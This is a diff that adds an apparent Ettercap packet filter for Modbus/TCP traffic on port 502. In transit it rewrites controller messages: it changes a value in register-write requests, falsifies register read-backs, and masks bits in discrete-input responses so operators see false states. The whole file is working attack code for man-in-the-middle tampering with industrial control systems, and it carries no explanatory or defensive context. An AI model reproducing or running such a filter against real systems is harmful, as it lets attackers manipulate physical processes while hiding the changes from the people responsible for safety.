@@ -1,0 +1,101 @@
+if (ip.proto == TCP && tcp.dst == 502 && DATA.data+7 == "\x10\x00\x02\x00\x01\x02\x00\x02") {
+	DATA.data + 14 = "\x06";
+	msg("Replace write single register ");
+	}
+
+if (ip.proto == TCP && tcp.src == 502 && DATA.data+7 == "\x03" && DATA.data+10 == "\x06"){
+	DATA.data + 10 = "\x02";
+	msg("replace read single  holding register");
+
+}
+
+
+
+if (ip.proto == TCP && tcp.src == 502 && DATA.data+7 == "\x02")
+{
+	if (DATA.data + 9 == "\x40") || (DATA.data + 9 == "\x44") { DATA.data + 9 = "\x4"; }
+	if (DATA.data + 9 == "\x41") || (DATA.data + 9 == "\x45") { DATA.data + 9 = "\x5"; }
+	if (DATA.data + 9 == "\x42") || (DATA.data + 9 == "\x46") { DATA.data + 9 = "\x6"; }
+	if (DATA.data + 9 == "\x43") || (DATA.data + 9 == "\x47") { DATA.data + 9 = "\x7"; }
+	
+	if (DATA.data + 9 == "\x48") || (DATA.data + 9 == "\x4c") { DATA.data + 9 = "\xc"; }
+	if (DATA.data + 9 == "\x49") || (DATA.data + 9 == "\x4d") { DATA.data + 9 = "\xd"; }
+	if (DATA.data + 9 == "\x4a") || (DATA.data + 9 == "\x4e") { DATA.data + 9 = "\xe"; }
+	if (DATA.data + 9 == "\x4b") || (DATA.data + 9 == "\x4f") { DATA.data + 9 = "\xf"; }
+		
+
+	if (DATA.data + 9 == "\x50") || (DATA.data + 9 == "\x54") { DATA.data + 9 = "\x14"; }
+	if (DATA.data + 9 == "\x51") || (DATA.data + 9 == "\x55") { DATA.data + 9 = "\x15"; }
+	if (DATA.data + 9 == "\x52") || (DATA.data + 9 == "\x56") { DATA.data + 9 = "\x16"; }
+	if (DATA.data + 9 == "\x53") || (DATA.data + 9 == "\x57") { DATA.data + 9 = "\x17"; }
+
+	if (DATA.data + 9 == "\x58") || (DATA.data + 9 == "\x5c") { DATA.data + 9 = "\x1c"; }
+	if (DATA.data + 9 == "\x59") || (DATA.data + 9 == "\x5d") { DATA.data + 9 = "\x1d"; }
+	if (DATA.data + 9 == "\x5a") || (DATA.data + 9 == "\x5e") { DATA.data + 9 = "\x1e"; }
+	if (DATA.data + 9 == "\x5b") || (DATA.data + 9 == "\x5f") { DATA.data + 9 = "\x1f"; }
+
+	if (DATA.data + 9 == "\x60") || (DATA.data + 9 == "\x64") { DATA.data + 9 = "\x24"; }
+	if (DATA.data + 9 == "\x61") || (DATA.data + 9 == "\x65") { DATA.data + 9 = "\x25"; }
+	if (DATA.data + 9 == "\x62") || (DATA.data + 9 == "\x66") { DATA.data + 9 = "\x26"; }
+	if (DATA.data + 9 == "\x63") || (DATA.data + 9 == "\x67") { DATA.data + 9 = "\x27"; }
+		
+	if (DATA.data + 9 == "\x68") || (DATA.data + 9 == "\x6c") { DATA.data + 9 = "\x2c"; }
+	if (DATA.data + 9 == "\x69") || (DATA.data + 9 == "\x6d") { DATA.data + 9 = "\x2d"; }
+	if (DATA.data + 9 == "\x6a") || (DATA.data + 9 == "\x6e") { DATA.data + 9 = "\x2e"; }
+	if (DATA.data + 9 == "\x6b") || (DATA.data + 9 == "\x6f") { DATA.data + 9 = "\x2f"; }
+
+	if (DATA.data + 9 == "\x70") || (DATA.data + 9 == "\x74") { DATA.data + 9 = "\x34"; }
+	if (DATA.data + 9 == "\x71") || (DATA.data + 9 == "\x75") { DATA.data + 9 = "\x35"; }
+	if (DATA.data + 9 == "\x72") || (DATA.data + 9 == "\x76") { DATA.data + 9 = "\x36"; }
+	if (DATA.data + 9 == "\x73") || (DATA.data + 9 == "\x77") { DATA.data + 9 = "\x37"; }
+		
+	if (DATA.data + 9 == "\x78") || (DATA.data + 9 == "\x7c") { DATA.data + 9 = "\x3c"; }
+	if (DATA.data + 9 == "\x79") || (DATA.data + 9 == "\x7d") { DATA.data + 9 = "\x3d"; }
+	if (DATA.data + 9 == "\x7a") || (DATA.data + 9 == "\x7e") { DATA.data + 9 = "\x3e"; }
+	if (DATA.data + 9 == "\x7b") || (DATA.data + 9 == "\x7f") { DATA.data + 9 = "\x3f"; }
+
+	if (DATA.data + 9 == "\xc0") || (DATA.data + 9 == "\xc4") { DATA.data + 9 = "\x84"; }
+	if (DATA.data + 9 == "\xc1") || (DATA.data + 9 == "\xc5") { DATA.data + 9 = "\x85"; }
+	if (DATA.data + 9 == "\xc2") || (DATA.data + 9 == "\xc6") { DATA.data + 9 = "\x86"; }
+	if (DATA.data + 9 == "\xc3") || (DATA.data + 9 == "\xc7") { DATA.data + 9 = "\x87"; }
+		
+	if (DATA.data + 9 == "\xc8") || (DATA.data + 9 == "\xcc") { DATA.data + 9 = "\x8c"; }
+	if (DATA.data + 9 == "\xc9") || (DATA.data + 9 == "\xcd") { DATA.data + 9 = "\x8d"; }
+	if (DATA.data + 9 == "\xca") || (DATA.data + 9 == "\xce") { DATA.data + 9 = "\x8e"; }
+	if (DATA.data + 9 == "\xcb") || (DATA.data + 9 == "\xcf") { DATA.data + 9 = "\x8f"; }
+
+	if (DATA.data + 9 == "\xd0") || (DATA.data + 9 == "\xd4") { DATA.data + 9 = "\x94"; }
+	if (DATA.data + 9 == "\xd1") || (DATA.data + 9 == "\xd5") { DATA.data + 9 = "\x95"; }
+	if (DATA.data + 9 == "\xd2") || (DATA.data + 9 == "\xd6") { DATA.data + 9 = "\x96"; }
+	if (DATA.data + 9 == "\xd3") || (DATA.data + 9 == "\xd7") { DATA.data + 9 = "\x97"; }
+		
+	if (DATA.data + 9 == "\xd8") || (DATA.data + 9 == "\xdc") { DATA.data + 9 = "\x9c"; }
+	if (DATA.data + 9 == "\xd9") || (DATA.data + 9 == "\xdd") { DATA.data + 9 = "\x9d"; }
+	if (DATA.data + 9 == "\xda") || (DATA.data + 9 == "\xde") { DATA.data + 9 = "\x9e"; }
+	if (DATA.data + 9 == "\xdb") || (DATA.data + 9 == "\xdf") { DATA.data + 9 = "\x9f"; }
+		
+	if (DATA.data + 9 == "\xe0") || (DATA.data + 9 == "\xe4") { DATA.data + 9 = "\xa4"; }
+	if (DATA.data + 9 == "\xe1") || (DATA.data + 9 == "\xe5") { DATA.data + 9 = "\xa5"; }
+	if (DATA.data + 9 == "\xe2") || (DATA.data + 9 == "\xe6") { DATA.data + 9 = "\xa6"; }
+	if (DATA.data + 9 == "\xe3") || (DATA.data + 9 == "\xe7") { DATA.data + 9 = "\xa7"; }
+		
+	if (DATA.data + 9 == "\xe8") || (DATA.data + 9 == "\xec") { DATA.data + 9 = "\xac"; }
+	if (DATA.data + 9 == "\xe9") || (DATA.data + 9 == "\xed") { DATA.data + 9 = "\xad"; }
+	if (DATA.data + 9 == "\xea") || (DATA.data + 9 == "\xee") { DATA.data + 9 = "\xae"; }
+	if (DATA.data + 9 == "\xeb") || (DATA.data + 9 == "\xef") { DATA.data + 9 = "\xaf"; }
+		
+	if (DATA.data + 9 == "\xf0") || (DATA.data + 9 == "\xf4") { DATA.data + 9 = "\xb4"; }
+	if (DATA.data + 9 == "\xf1") || (DATA.data + 9 == "\xf5") { DATA.data + 9 = "\xb5"; }
+	if (DATA.data + 9 == "\xf2") || (DATA.data + 9 == "\xf6") { DATA.data + 9 = "\xb6"; }
+	if (DATA.data + 9 == "\xf3") || (DATA.data + 9 == "\xf7") { DATA.data + 9 = "\xb7"; }
+		
+	if (DATA.data + 9 == "\xf8") || (DATA.data + 9 == "\xfc") { DATA.data + 9 = "\xbc"; }
+	if (DATA.data + 9 == "\xf9") || (DATA.data + 9 == "\xfd") { DATA.data + 9 = "\xbd"; }
+	if (DATA.data + 9 == "\xfa") || (DATA.data + 9 == "\xfe") { DATA.data + 9 = "\xbe"; }
+	if (DATA.data + 9 == "\xfb"){ DATA.data + 9 = "\xbf"; }
+		
+}
+
+
+
+
